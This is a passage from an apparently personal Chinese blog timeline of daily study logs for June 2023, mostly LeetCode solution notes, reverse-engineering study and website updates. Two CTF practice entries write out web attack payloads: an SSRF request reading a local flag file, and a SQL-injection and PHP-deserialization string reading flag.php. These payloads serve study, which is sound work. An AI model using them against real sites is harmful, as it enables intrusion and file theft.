title="2023-6-30"></a>2023-6-30</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-6-30"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-6-30-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-6-30-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-6-30-1"><p>英语词。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-6-30-2"><p><a href="https://leetcode.cn/problems/circular-sentence/">2490. 回环句</a></p><p>python3思路：先判断字符串首尾字符是否相等，然后一个for遍历，遍历到空格判断空格前后字符是否相等。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-6-29"><a href="#2023-6-29" class="headerlink" title="2023-6-29"></a>2023-6-29</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-6-29"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-6-29-1">【每日总结】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-6-29-1"><p>玩了一天。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-6-28"><a href="#2023-6-28" class="headerlink" title="2023-6-28"></a>2023-6-28</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-6-28"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-6-28-1">【每日总结】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-6-28-1"><p>玩了一天。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-6-27"><a href="#2023-6-27" class="headerlink" title="2023-6-27"></a>2023-6-27</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-6-27"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-6-27-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-6-27-2">力扣【每日】</button></li><li class="tab"><button type="button" data-href="#2023-6-27-3">部分文章【更新】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-6-27-1"><p>英语词听。</p><p>逆向：字符串比较。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-6-27-2"><p><a href="https://leetcode.cn/problems/maximum-subarray-sum-with-one-deletion/">1186. 删除一次得到子数组最大和</a></p><p>python3思路：官解，不会。动态规划。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-6-27-3"><p>反汇编代码分析：汇编指令。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-6-26"><a href="#2023-6-26" class="headerlink" title="2023-6-26"></a>2023-6-26</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-6-26"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-6-26-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-6-26-2">力扣【每日】</button></li><li class="tab"><button type="button" data-href="#2023-6-26-3">攻防世界【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-6-26-1"><p>英语词听读。</p><p>算法题，Web题。</p><p>MMD学习。</p><p>网站：更新分类样式，卸载了首页的分类栏。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-6-26-2"><p><a href="https://leetcode.cn/problems/find-the-pivot-integer/">2485. 找出中枢整数</a></p><p>python3思路：先算出lsum和rsum，然后一个for，每次让<code>lsum+=i</code>，<code>rsum-=(i-1)</code>，判断两者是否相等。</p><p>时间：<script type="math/tex">O(n)</script></p><p>空间：<script type="math/tex">O(1)</script></p><p>更节约时间的可以通过等差数列求和，判断<script type="math/tex">sum(1,x)=sum(x,n)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-6-26-3"><p>Web——babyweb</p><p>查看了提示。</p><p>投机：<code>/ssrf.php?urlfile:///flag</code></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-6-25"><a href="#2023-6-25" class="headerlink" title="2023-6-25"></a>2023-6-25</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-6-25"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-6-25-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-6-25-2">力扣【每日】</button></li><li class="tab"><button type="button" data-href="#2023-6-25-3">攻防世界【每日】</button></li><li class="tab"><button type="button" data-href="#2023-6-25-4">部分文章【更新】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-6-25-1"><p>英语词听读。</p><p>算法题，Web题。</p><p>逆向：逻辑运算。</p><p>MMD学习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-6-25-2"><p><a href="https://leetcode.cn/problems/circle-and-rectangle-overlapping/">1401. 圆和矩形是否有重叠</a></p><p>python3思路：评论区。先找到矩形上离圆心最近的点，然后判断<script type="math/tex">(x^2 + y^2) <= r^2</script></p><p>代码：<code>dx,dy = max(0,x1-xCenter,xCenter-x2),max(0,y1-yCenter,yCenter-y2)</code></p><p>时空复杂度：<script type="math/tex">O(1)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-6-25-3"><p>Web——fakebook</p><p>查看了提示。</p><p>关键点：</p><ol><li>御剑扫描后台，发现flag.php但访问没有反应。</li><li>注册，blog不合法。robots.txt发现bak文件，查看源码，完成blog的注册。</li><li>注册成功后进入view.php?no=1，整形联合报错注入，union和select之间要空格绕过。</li><li>发现反序列化函数，构造payload<code>view.php?no=1 and 1=2 union/**/select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;}&#39; --+</code></li><li>在工作台发现结果，base64解码。</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-6-25-4"><p>反汇编代码分析：逻辑运算。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-6-24"><a href="#2023-6-24" class="headerlink" title="2023-6-24"></a>2023-6-24</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-6-24"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-6-24-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-6-24-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-6-24-1"><p>英语单词。</p><p>逆向：浮点数操作。</p><p>渗透：msf复习。</p><p>MMD学习。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-6-24-2"><p><a href="https://leetcode.cn/problems/maximize-grid-happiness/">1659. 最大化网格幸福感</a></p><p>这题不会</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-6-23"><a href="#2023-6-23" class="headerlink" title="2023-6-23"></a>2023-6-23</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-6-23"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-6-23-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-6-23-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-6-23-1"><p>英语单词。</p><p>算法题。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-6-23-2"><p><a href="https://leetcode.cn/problems/maximum-value-of-a-string-in-an-array/">2496. 数组中字符串的最大值</a></p><p>python3整活：<code>return max([int(s) if s.isdigit() else len(s) for s in strs])</code></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-6-22"><a href="#2023-6-22" class="headerlink" title="2023-6-22"></a>2023-6-22</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-6-22"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-6-22-1">【每日总结】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-6-22-1"><p>玩了一天。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-6-21"><a href="#2023-6-21" class="headerlink" title="2023-6-21"></a>2023-6-21</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-6-21"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-6-21-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-6-21-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-6-21-1"><p>玩了一天。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-6-21-2"><p><a href="https://leetcode0.cn/problems/fHi6rV/">LCP 41. 黑白翻转棋</a></p><p>思路：暴力BFS，没写出来。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-6-20"><a href="#2023-6-20" class="headerlink" title="2023-6-20"></a>2023-6-20</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-6-20"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-6-20-1">【每日总结】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-6-20-1"><p>玩了一天。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-6-19"><a href="#2023-6-19" class="headerlink" title="2023-6-19"></a>2023-6-19</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-6-19"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-6-19-1">【每日总结】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-6-19-1"><p>玩了一天。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-6-18"><a href="#2023-6-18" class="headerlink" title="2023-6-18"></a>2023-6-18</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-6-18"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-6-18-1">【每日总结】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-6-18-1"><p>玩了一天。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-6-17"><a href="#2023-6-17" class="headerlink" title="2023-6-17"></a>2023-6-17</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-6-17"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-6-17-1">【每日总结】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-6-17-1"><p>玩了一天。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-6-16"><a href="#2023-6-16" class="headerlink" title="2023-6-16"></a>2023-6-16</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-6-16"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-6-16-1">【每日总结】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-6-16-1"><p>玩了一天。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-6-15"><a href="#2023-6-15" class="headerlink" title="2023-6-15"></a>2023-6-15</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-6-15"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-6-15-1">【每日总结】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-6-15-1"><p>玩了一天。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-6-14"><a href="#2023-6-14" class="headerlink" title="2023-6-14"></a>2023-6-14</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-6-14"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-6-14-1">【每日总结】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-6-14-1"><p>Web开发：管理系统全功能完成。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-6-13"><a href="#2023-6-13" class="headerlink" title="2023-6-13"></a>2023-6-13</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-6-13"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-6-13-1">【每日总结】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-6-13-1"><p>英语单词。</p><p>Web开发：管理系统的搜索功能。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-6-12"><a href="#2023-6-12" class="headerlink" title="2023-6-12"></a>2023-6-12</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-6-12"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-6-12-1">【每日总结】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-6-12-1"><p>英语单词。</p><p>Web开发：管理系统的写入数据库功能。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-6-11"><a href="#2023-6-11" class="headerlink" title="2023-6-11"></a>2023-6-11</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-6-11"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-6-11-1">【每日总结】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-6-11-1"><p>英语单词。</p><p>Web开发：管理系统的注册和登录界面（连接数据库操作）。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-6-10"><a href="#2023-6-10" class="headerlink" title="2023-6-10"></a>2023-6-10</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-6-10"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-6-10-1">【每日总结】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-6-10-1"><p>英语单词。</p><p>算法赛。</p><p>Web开发：管理系统的后台功能页面完善。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-6-9"><a href="#2023-6-9" class="headerlink" title="2023-6-9"></a>2023-6-9</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-6-9"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-6-9-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-6-9-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-6-9-1"><p>英语单词。</p><p>Web开发：管理系统的后台功能页面完善。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-6-9-2"><p><a href="https://leetcode.cn/problems/modify-graph-edge-weights/">2699. 修改图中的边权</a></p><p>阿巴阿巴</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-6-8"><a href="#2023-6-8" class="headerlink" title="2023-6-8"></a>2023-6-8</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-6-8"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-6-8-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-6-8-2">力扣【每日】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-6-8-1"><p>英语单词。</p><p>区块链书本复习。</p><p>Web开发：管理系统的后台功能页面完善。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-6-8-2"><p><a href="https://leetcode.cn/problems/tiling-a-rectangle-with-the-fewest-squares/">1240. 铺瓷砖</a></p><p>阿巴阿巴</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-6-7"><a href="#2023-6-7" class="headerlink" title="2023-6-7"></a>2023-6-7</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-6-7"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-6-7-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-6-7-2">力扣【每日】</button></li><li class="tab"><button type="button" data-href="#2023-6-7-3">修复问题【网站】</button></li><li class="tab"><button type="button" data-href="#2023-6-7-4">部分文章【更新】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-6-7-1"><p>英语单词。</p><p>算法题。</p><p>网站代码块和链接问题修复。</p><p>区块链：私有链实现。（存在错误）</p><p>PHP：完善笔记。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-6-7-2"><p><a href="https://leetcode.cn/problems/mice-and-cheese/submissions/">2611. 老鼠和奶酪 - 力扣（LeetCode）</a></p><p>开始想用dfs，会超内存。然后看了官解。</p><p>python3思路：先算reward1-reward2存入diff，然后排序，然后把reward2的值求和，最后做一个for到k，每次用结果加上diff[len - 1 - i]。这样等于是选了最优的reward1的值。</p><p>时间：<script type="math/tex">O(nlongn)</script></p><p>空间：<script type="math/tex">O(n)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-6-7-3"><ol><li>网站信息和每日活动移动至关于位置，不再在首页中显示。</li><li>网站代码块问题修复。修复方式：卸载全部文章再重新放入网站中。</li><li>修复了链接其他文章网址错误的问题。</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-6-7-4"><p>PHP：动态交互和部分安全编程。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-6-6"><a href="#2023-6-6" class="headerlink" title="2023-6-6"></a>2023-6-6</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-6-6"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-6-6-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-6-6-2">力扣【每日】</button></li><li class="tab"><button type="button" data-href="#2023-6-6-3">修复问题【网站】</button></li><li class="tab"><button type="button" data-href="#2023-6-6-4">部分文章【更新】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-6-6-1"><p>英语单词。</p><p>算法题。</p><p>修复网站代码块问题，但C#脚本文件存在代码块问题。</p><p>Web开发：管理系统的登录页面前端程序完善。</p><p>Unity：叉乘，欧拉角，四元数。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-6-6-2"><p><a href="https://leetcode.cn/problems/equal-row-and-column-pairs/">2352. 相等行列对</a></p><p>python3思路：模拟+字典。先在一个for里获得每行和每列的值，判断值在不在字典中，不在就存入，在就+1。字典的键是每一行或每一列做成的元组，值是一个列表，存[row,col]（每行和每列出现该元组的次数）。最后再一个for每次从字典中取出一个值，如果都大于零就row * col加到count中，最后返回count。</p><p>时间：<script type="math/tex">O(n^2)</script></p><p>空间：<script type="math/tex">O(n^2)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-6-6-3"><p>设置了代码块自动换行。但是设置代码块自动换行后代码块前会自动多出两列，原因不明。修复方式：直接用css隐藏。</p><p>C#脚本代码块外框架，原因目前不明。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-6-6-4"><p>Unity脚本：三维数学。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-6-5"><a href="#2023-6-5" class="headerlink" title="2023-6-5"></a>2023-6-5</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-6-5"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-6-5-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-6-5-2">力扣【每日】</button></li><li class="tab"><button type="button" data-href="#2023-6-5-3">部分文章【更新】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-6-5-1"><p>英语单词。</p><p>算法题。</p><p>逆向：while/do-while，浮点数。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-6-5-2"><p><a href="https://leetcode.cn/problems/apply-operations-to-an-array/submissions/">2460. 对数组执行操作 - 力扣（LeetCode）</a></p><p>python3思路：双指针，对nums一个for获得rp，一个if，当rp+1&lt;len且满足题意时执行题意。然后再一个if，如果rp指的值不是0，就和lp指的值进行交换，然后lp+=1，lp初始为0。lp主要用于记录上一个0的位置。代码基本同官解。</p><p>时间：<script type="math/tex">O(n)</script></p><p>空间：<script type="math/tex">O(1)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-6-5-3"><p>masm32：浮点数。</p><p>反汇编代码分析：while/do-while。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-6-4"><a href="#2023-6-4" class="headerlink" title="2023-6-4"></a>2023-6-4</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-6-4"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-6-4-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-6-4-2">力扣【每日】</button></li><li class="tab"><button type="button" data-href="#2023-6-4-3">修复问题【网站】</button></li><li class="tab"><button type="button" data-href="#2023-6-4-4">新加配置【网站】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-6-4-1"><p>英语单词。</p><p>算法题。</p><p>完成了网站魔改的记录。</p><p>网站更新至V1.0，推送至github中。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-6-4-2"><p><a href="https://leetcode.cn/problems/number-of-distinct-averages/">2465. 不同的平均值数目 - 力扣（LeetCode）</a></p><p>python3思路：排序+字典。先排序，然后首尾开始找，判断和是否在字典中，不在则结果加一并把值存入字典。</p><p>时间：<script type="math/tex">O(nlogn)</script></p><p>空间：<script type="math/tex">O(n)</script></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-6-4-3"><p>V1.0修复的网站问题如下：</p><ol><li>文章的链接和图片错误</li><li>配置了<a href="https://ling71.gitee.io/posts/1518592324.html">mathjax</a>显示数学公式</li><li>修复了页脚时钟和回到顶端百分比的错误</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-6-4-4"><p>V1.0新加的网站样式如下：</p><ol><li>简介栏颜色</li><li>滚动条属性设置（火狐无效）</li><li>复制和使用F12提示</li><li>按键防抖</li><li><p>图片由API改为固定，图片来源如下：</p><ul><li><p><a href="https://api.yimian.xyz/img?type=moe">https://api.yimian.xyz/img?type=moe</a></p></li><li><p><a href="https://www.dmoe.cc/random.php">https://www.dmoe.cc/random.php</a></p></li><li><p><a href="http://service-ki5kzs0b-1306777571.sh.apigw.tencentcs.com/Mobuv2">http://service-ki5kzs0b-1306777571.sh.apigw.tencentcs.com/Mobuv2</a></p></li><li><p><a href="https://img.paulzzh.tech/touhou/random">https://img.paulzzh.tech/touhou/random</a></p></li><li><p><a href="https://api.ghser.com/random/api.php">https://api.ghser.com/random/api.php</a></p></li><li><p><a href="https://api.ghser.com/random/pc.php">https://api.ghser.com/random/pc.php</a></p></li><li><p><a href="https://api.ghser.com/random/pe.php">https://api.ghser.com/random/pe.php</a></p></li><li><p><a href="https://api.caonm.net/api/dm/index.php">https://api.caonm.net/api/dm/index.php</a></p></li><li><p><a href="https://api.asxe.vip/random.php">https://api.asxe.vip/random.php</a></p></li><li><p><a href="https://api.asxe.vip/scenery.php">https://api.asxe.vip/scenery.php</a></p></li><li><p><a href="https://www.loliapi.com/acg/">https://www.loliapi.com/acg/</a></p></li></ul></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-6-3"><a href="#2023-6-3" class="headerlink" title="2023-6-3"></a>2023-6-3</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-6-3"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-6-3-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-6-3-2">力扣【每日】</button></li><li class="tab"><button type="button" data-href="#2023-6-3-3">拓展配置【网站】</button></li><li class="tab"><button type="button" data-href="#2023-6-3-4">部分文章【更新】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-6-3-1"><p>英语单词。</p><p>算法题。</p><p>配置了网站相关属性。</p><p>进行了网站魔改的记录。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-6-3-2"><p><a href="https://leetcode.cn/problems/swap-for-longest-repeated-character-substring/submissions/">1156. 单字符重复子串的最大长度 - 力扣（LeetCode）</a></p><p>思路是双指针，但是没指出来，学习评论区。</p><p>python3思路：双指针。先统计每个字符出现的个数存在dic中。然后while遍历，找到两个相邻仅一个不同字符的相同字符子串，左右子串长度分别为l和r，求出<code>res = max(res, min(l + r + 1, dic[c]))</code>为最大值，然后左指针指向第一个不同字符继续遍历。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-6-3-3"><p>今天新增的拓展如下：</p><ol><li>图片配置。</li><li>滚动条属性设置。</li><li>使用控制台提示。</li><li>复制提示框。</li><li>按键防抖。</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-6-3-4"><p>新增网站魔改记录。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></div></div><div class="timeline-item"><div class="timeline-item-title"><div class="item-circle"><h3 id="2023-6-2"><a href="#2023-6-2" class="headerlink" title="2023-6-2"></a>2023-6-2</h3></div></div><div class="timeline-item-content"><div class="tabs" id="2023-6-2"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#2023-6-2-1">【每日总结】</button></li><li class="tab"><button type="button" data-href="#2023-6-2-2">力扣【每日】</button></li><li class="tab"><button type="button" data-href="#2023-6-2-3">部分文章【更新】</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="2023-6-2-1"><p>英语单词。</p><p>力扣题。</p><p>逆向：for、i++和++i。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="2023-6-2-2"><p><a href="https://leetcode.cn/problems/count-vowel-strings-in-ranges/submissions/">2559. 统计范围内的元音字符串数 - 